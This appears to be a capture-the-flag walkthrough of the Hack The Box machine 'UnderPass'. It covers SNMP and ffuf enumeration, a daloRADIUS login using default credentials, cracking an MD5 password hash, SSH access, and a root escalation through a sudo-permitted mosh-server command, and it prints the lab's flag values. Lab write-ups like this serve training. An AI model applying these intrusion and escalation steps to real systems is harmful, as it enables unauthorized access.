iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (7869780) 21:51:37.80
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 01 05 01 37 14 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 212
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```
A potential user name:
```Bash
steve@underpass.htb
```

### FFUF
We want to do directory enumeration a bit differently this time:
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-9wmeajydlw]─[~]
└──╼ [★]$ ffuf -u "http://underpass.htb/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -e .php,.html,.js,.zip,.asp,.bak,.old

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://underpass.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .html .js .zip .asp .bak .old 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-medium.txt.bak [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 69ms]
#.html                  [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 68ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 69ms]
#.php                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 69ms]
#.zip                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 69ms]
# directory-list-2.3-medium.txt.js [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 70ms]
# Copyright 2007 James Fisher.asp [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 70ms]
#.zip                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 70ms]
#                       [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 70ms]
# directory-list-2.3-medium.txt.html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 71ms]
# Attribution-Share Alike 3.0 License. To view a copy of this.php [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Attribution-Share Alike 3.0 License. To view a copy of this.html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 68ms]
# Attribution-Share Alike 3.0 License. To view a copy of this.asp [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Attribution-Share Alike 3.0 License. To view a copy of this.zip [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Attribution-Share Alike 3.0 License. To view a copy of this.old [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Attribution-Share Alike 3.0 License. To view a copy of this.js [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 69ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 69ms]
# Attribution-Share Alike 3.0 License. To view a copy of this.bak [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 68ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.zip [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.asp [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.old [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.js [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# or send a letter to Creative Commons, 171 Second Street,.html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# or send a letter to Creative Commons, 171 Second Street,.js [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.bak [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 68ms]
# or send a letter to Creative Commons, 171 Second Street,.php [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 68ms]
# or send a letter to Creative Commons, 171 Second Street,.zip [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# or send a letter to Creative Commons, 171 Second Street,.bak [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Suite 300, San Francisco, California, 94105, USA..php [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Suite 300, San Francisco, California, 94105, USA..js [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Suite 300, San Francisco, California, 94105, USA..html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# or send a letter to Creative Commons, 171 Second Street,.old [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# or send a letter to Creative Commons, 171 Second Street,.asp [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Suite 300, San Francisco, California, 94105, USA..zip [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Suite 300, San Francisco, California, 94105, USA..asp [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
#                       [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
#.php                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
#.js                    [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
#.html                  [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Suite 300, San Francisco, California, 94105, USA..bak [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
#.zip                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
#.asp                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Suite 300, San Francisco, California, 94105, USA..old [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 68ms]
#.old                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
#.bak                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Priority ordered case-sensitive list, where entries were found.php [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Priority ordered case-sensitive list, where entries were found.html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Priority ordered case-sensitive list, where entries were found.asp [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Priority ordered case-sensitive list, where entries were found.zip [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Priority ordered case-sensitive list, where entries were found.js [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# on at least 2 different hosts [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Priority ordered case-sensitive list, where entries were found.old [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# Priority ordered case-sensitive list, where entries were found.bak [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# on at least 2 different hosts.php [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
# on at least 2 different hosts.html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# on at least 2 different hosts.js [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# on at least 2 different hosts.asp [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# on at least 2 different hosts.bak [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
#.html                  [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# on at least 2 different hosts.zip [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
#                       [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# on at least 2 different hosts.old [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
#.php                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
#.js                    [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
#.asp                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
#.old                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
                        [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
#.zip                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
#.bak                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
index.html              [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 66ms]
# Copyright 2007 James Fisher.php [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 630ms]
# Copyright 2007 James Fisher.js [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 1633ms]
# This work is licensed under the Creative Commons.html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 1633ms]
#.old                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 2636ms]
# directory-list-2.3-medium.txt.php [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 2639ms]
#.asp                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 2640ms]
# This work is licensed under the Creative Commons.old [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 2641ms]
#.asp                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3641ms]
# Copyright 2007 James Fisher.zip [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3645ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3647ms]
#.bak                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3648ms]
# Copyright 2007 James Fisher.html [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3649ms]
# This work is licensed under the Creative Commons.php [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3651ms]
# Copyright 2007 James Fisher [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3651ms]
# directory-list-2.3-medium.txt.zip [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 3652ms]
# This work is licensed under the Creative Commons.asp [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4650ms]
# directory-list-2.3-medium.txt.old [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4654ms]
#.js                    [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4656ms]
# This work is licensed under the Creative Commons.bak [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4661ms]
#.js                    [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4661ms]
# This work is licensed under the Creative Commons.js [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4661ms]
# This work is licensed under the Creative Commons.zip [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4664ms]
# directory-list-2.3-medium.txt.asp [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4666ms]
# Copyright 2007 James Fisher.old [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4666ms]
#                       [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4667ms]
#.bak                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4668ms]
#.old                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4669ms]
# Copyright 2007 James Fisher.bak [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4672ms]
#.php                   [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4673ms]
#.html                  [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 4674ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
                        [Status: 200, Size: 10671, Words: 3496, Lines: 364, Duration: 67ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
:: Progress: [1764480/1764480] :: Job [1/1] :: 600 req/sec :: Duration: [0:49:30] :: Errors: 0 ::
```
This scan has way too much noise and fails to find anything.\
According to the guide, I am supposed to find /app/operators/login.php hmmm
> Solved the issue!
>> I needed to go from this line in the smbwalk output: **iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only *daloradius* server in the basin!"**

```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-9wmeajydlw]─[~]
└──╼ [★]$ ffuf -u "http://underpass.htb/daloradius/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt  -e .php,.html,.js,.zip,.asp,.bak,.old

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://underpass.htb/daloradius/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .html .js .zip .asp .bak .old 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.gitignore              [Status: 200, Size: 221, Words: 1, Lines: 13, Duration: 67ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.html               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.old                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.asp                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.zip                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.hta.bak                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htaccess.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.js                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.htaccess.js            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htaccess.old           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htaccess.zip           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htpasswd.js            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 65ms]
.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htaccess.asp           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.htpasswd.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htpasswd.zip           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htpasswd.asp           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 65ms]
.htpasswd.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htpasswd.old           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
ChangeLog               [Status: 200, Size: 24703, Words: 3653, Lines: 413, Duration: 66ms]
LICENSE                 [Status: 200, Size: 18011, Words: 3039, Lines: 341, Duration: 66ms]
app                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 68ms]
contrib                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 67ms]
doc                     [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 66ms]
library                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 66ms]
setup                   [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 66ms]
:: Progress: [37784/37784] :: Job [1/1] :: 602 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
```
Now we see *app*!\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/2ef4b34a-bdf2-4f40-8839-f99d4417cfe4) returned 404 during the image audit (2026-10-08).


Huzzah! That's not a 404 we're looking at, so we are on the right track.
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-9wmeajydlw]─[~]
└──╼ [★]$ ffuf -u "http://underpass.htb/daloradius/app/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt  -e .php,.html,.js,.zip,.asp,.bak,.old

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://underpass.htb/daloradius/app/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .html .js .zip .asp .bak .old 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.js                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.html               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.zip                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.asp                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.bak                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.hta.old                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htaccess.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htaccess.js            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.htaccess.zip           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.htaccess.asp           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
.htaccess.old           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
.htpasswd.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
.htpasswd.bak           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
.htpasswd.zip           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
.htpasswd.asp           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
.htpasswd.js            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
.htpasswd.old           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 66ms]
common                  [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 66ms]
users                   [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 66ms]
:: Progress: [37784/37784] :: Job [1/1] :: 598 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
```
mmm...we aren'ts seen operators with this wordlist...so before I cheat and try another one that i know has it, let me see what these resolve to.\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/93ce8dba-6bbb-4c64-98f1-d231893db818) returned 404 during the image audit (2026-10-08).


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/5396927d-f86b-4715-ac78-998e4cec3d5f) returned 404 during the image audit (2026-10-08).


> Hey-o! *users* does have a login!
>> But that's for client-side...we still want the admin


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/a46154f7-1818-4ddd-a833-1a12b31b5f62) returned 404 during the image audit (2026-10-08).


I am just going to go ahead and go to it without doing the search so I can continue.

---
### DaloRadius
daloRADIUS is "and advanced RADISU web platform aimed at managing Hotspots and general-perpose ISP deployments.\
[SOURCE](https://github.com/lirantal/daloradius)

#### Gaining Access
The default credentials are:
```Bash
administrator:radius
```
Let's try them out:\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/7e6ac779-3e09-4499-af83-3b6a72b08f14) returned 404 during the image audit (2026-10-08).


That's kind of weird...maybe it is broken or I should try something else like the SSH first.

> CONFIRMED BROKEN:

The page should have taken me here according to the guide:\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/f73ea259-87e9-4956-bc7d-6730f02b1a18) returned 404 during the image audit (2026-10-08).


> Got it after a reset!\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/07c0da56-7603-49a1-a5bd-55d3097ad8e3) returned 404 during the image audit (2026-10-08).


We found a user:\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/dcba0b9f-28d2-45cf-90a7-3441b31621b9) returned 404 during the image audit (2026-10-08).


```Bash
svcMosh:412DD4759978ACFCC81DEAB01B382403
```
DaloRADIUS passwords are MD5 hashes.\
Using [CrackStation](https://crackstation.net/) I was able to get an answer:\
```Bash
svcMosh:underwaterfriends
```

---
### User svcMosh
We gained access!
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-9wmeajydlw]─[~]
└──╼ [★]$ ssh svcMosh@underpass.htb 
The authenticity of host 'underpass.htb (10.10.11.48)' can't be established.
ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'underpass.htb' (ED25519) to the list of known hosts.
svcMosh@underpass.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jan  5 05:48:21 PM UTC 2025

  System load:  0.0               Processes:             224
  Usage of /:   84.8% of 3.75GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Dec 12 15:45:42 2024 from 10.10.14.65
svcMosh@underpass:~$ 
```
```Bash
svcMosh@underpass:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .profile  .ssh  user.txt
svcMosh@underpass:~$ ls -l user.txt 
-rw-r----- 1 root svcMosh 33 Jan  5 17:37 user.txt
svcMosh@underpass:~$ cat user.txt 
543b5cf2c0e168d87aa9e3600ffbeca1
```
> First flag found: ***543b5cf2c0e168d87aa9e3600ffbeca1***

#### Escalation
```Bash
svcMosh@underpass:~$ sudo bash -l
[sudo] password for svcMosh: 
Sorry, user svcMosh is not allowed to execute '/usr/bin/bash -l' as root on localhost.
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```
The user is only able to access */usr/bin/mosh-server*\
How can we use that to our advantage?\
What even is a mosh-server? Found this [man page](https://linux.die.net/man/1/mosh-server)

```Bash
svcMosh@underpass:~$ mosh
Usage: /usr/bin/mosh [options] [--] [user@]host [command...]
        --client=PATH        mosh client on local machine
                                (default: "mosh-client")
        --server=COMMAND     mosh server on remote machine
                                (default: "mosh-server")

        --predict=adaptive      local echo for slower links [default]
-a      --predict=always        use local echo even on fast links
-n      --predict=never         never use local echo
        --predict=experimental  aggressively echo even when incorrect

-4      --family=inet        use IPv4 only
-6      --family=inet6       use IPv6 only
        --family=auto        autodetect network type for single-family hosts only
        --family=all         try all network types
        --family=prefer-inet use all network types, but try IPv4 first [default]
        --family=prefer-inet6 use all network types, but try IPv6 first
-p PORT[:PORT2]
        --port=PORT[:PORT2]  server-side UDP port or range
                                (No effect on server-side SSH port)
        --bind-server={ssh|any|IP}  ask the server to reply from an IP address
                                       (default: "ssh")

        --ssh=COMMAND        ssh command to run when setting up session
                                (example: "ssh -p 2222")
                                (default: "ssh")

        --no-ssh-pty         do not allocate a pseudo tty on ssh connection

        --no-init            do not send terminal initialization string

        --local              run mosh-server locally without using ssh

        --experimental-remote-ip=(local|remote|proxy)  select the method for
                             discovering the remote IP address to use for mosh
                             (default: "proxy")

        --help               this message
        --version            version and copyright information

Please report bugs to mosh-devel@mit.edu.
Mosh home page: https://mosh.org
```
Let us try something...:
```Bash
mosh --server="sudo /usr/bin/mosh-server" localhost
```

pwned!
```Bash
root@underpass:~# ls -l
total 4
-rw-r----- 1 root root 33 Jan  5 17:37 root.txt
root@underpass:~# cat root.txt 
44c13587615c8d2ad75ffa5b119460fb
```
> Got root access and the flag!
>> ***44c13587615c8d2ad75ffa5b119460fb***


